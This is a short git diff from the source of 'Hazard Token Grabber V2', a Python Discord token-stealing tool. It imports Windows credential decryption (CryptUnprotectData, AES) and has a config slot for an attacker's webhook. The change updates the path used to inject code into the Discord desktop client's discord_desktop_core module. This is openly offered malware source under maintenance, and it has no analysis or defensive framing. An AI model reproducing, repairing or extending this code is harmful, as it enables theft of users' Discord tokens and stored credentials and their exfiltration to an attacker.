@@ -17,8 +17,6 @@ from re import findall, match
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
-from time import sleep
-
 config = {
     # replace WEBHOOK_HERE with your webhook
     'webhook': "WEBHOOK_HERE",
@@ -160,7 +158,7 @@ class Hazard_Token_Grabber_V2(functions):
                 for __dir in os.listdir(os.path.abspath(discord)):
                     if match(r'app-(\d*\.\d*)*', __dir):
                         app = os.path.abspath(disc_sep+__dir)
-                        inj_path = app+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\'
+                        inj_path = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
                         if os.path.exists(inj_path):
                             if self.startup not in argv[0]:
                                 try:
